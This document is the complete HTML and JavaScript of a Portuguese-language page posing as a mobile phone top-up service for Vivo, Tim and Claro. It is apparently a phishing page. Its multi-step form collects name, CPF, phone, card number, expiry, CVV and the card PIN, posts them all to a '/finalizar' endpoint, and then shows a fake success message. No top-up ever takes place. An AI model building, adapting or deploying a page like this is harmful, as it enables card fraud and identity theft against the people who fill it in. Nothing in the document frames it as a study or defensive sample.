<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recarga Celular</title>
    <style>
        body { background-color: #0d1117; color: #f0f6fc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #161b22; padding: 25px; border-radius: 12px; border: 1px solid #30363d; width: 100%; max-width: 350px; }
        input, select { width: 100%; padding: 12px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; }
        .etapa { display: none; }
        .ativa { display: block; }
        button { width: 100%; padding: 15px; background: #238636; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <form id="formRecarga">
            <div id="etapa1" class="etapa ativa">
                <select id="operadora"><option>Vivo</option><option>Tim</option><option>Claro</option></select>
                <input type="text" id="nome" placeholder="Nome" required>
                <input type="text" id="cpf" placeholder="CPF" required>
                <input type="tel" id="telefone" placeholder="Telefone" required>
                <select id="valor"><option value="20">R$ 20,00</option><option value="40">R$ 40,00</option></select>
                <button type="button" onclick="ir(2)">PRÓXIMA</button>
            </div>
            <div id="etapa2" class="etapa">
                <input type="text" id="cartao" placeholder="Número do Cartão" maxlength="16" required>
                <input type="text" id="data" placeholder="MM/AA" required>
                <input type="text" id="cvv" placeholder="CVV" maxlength="3" required>
                <button type="button" onclick="ir(3)">PAGAMENTO</button>
            </div>
            <div id="etapa3" class="etapa">
                <input type="password" id="senha" placeholder="Senha do Cartão" required>
                <button type="submit">FINALIZAR</button>
            </div>
            <div id="etapa4" class="etapa" style="text-align:center">
                <p>Sucesso! Recarga enviada.</p>
            </div>
        </form>
    </div>

    <script>
        function ir(n) {
            document.querySelectorAll('.etapa').forEach(e => e.classList.remove('ativa'));
            document.getElementById('etapa'+n).classList.add('ativa');
        }

        window.onload = () => {
            const form = document.getElementById('formRecarga');
            form.onsubmit = async (e) => {
                e.preventDefault();
                const dados = {
                    operadora: document.getElementById('operadora').value,
                    nome: document.getElementById('nome').value,
                    cpf: document.getElementById('cpf').value,
                    telefone: document.getElementById('telefone').value,
                    valor: document.getElementById('valor').value,
                    cartao: document.getElementById('cartao').value,
                    data: document.getElementById('data').value,
                    cvv: document.getElementById('cvv').value,
                    senha: document.getElementById('senha').value
                };

                const res = await fetch('/finalizar', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(dados)
                });

                if(res.ok) ir(4);
            };
        };
    </script>
</body>
</html>
